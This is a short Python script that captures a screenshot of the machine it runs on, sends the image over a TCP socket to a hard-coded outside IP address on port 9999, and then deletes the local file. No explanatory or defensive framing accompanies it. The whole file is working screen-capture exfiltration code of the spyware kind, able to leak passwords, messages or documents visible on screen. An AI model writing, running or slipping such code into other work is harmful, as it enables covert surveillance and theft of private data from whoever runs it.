import pyautogui
import socket
import os

def take_screenshot(filename):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def send_file(filename, host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        with open(filename, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                client_socket.send(data)

        client_socket.close()
        print(f"File {filename} success sent to {host}:{port}")

    except Exception as e:
        print(f"Error : {str(e)}")

if __name__ == "__main__":
    filename = "screenshot.png"

    take_screenshot(filename)

    host = '113.11.180.72'
    port = 9999

    send_file(filename, host, port)

    os.remove(filename)
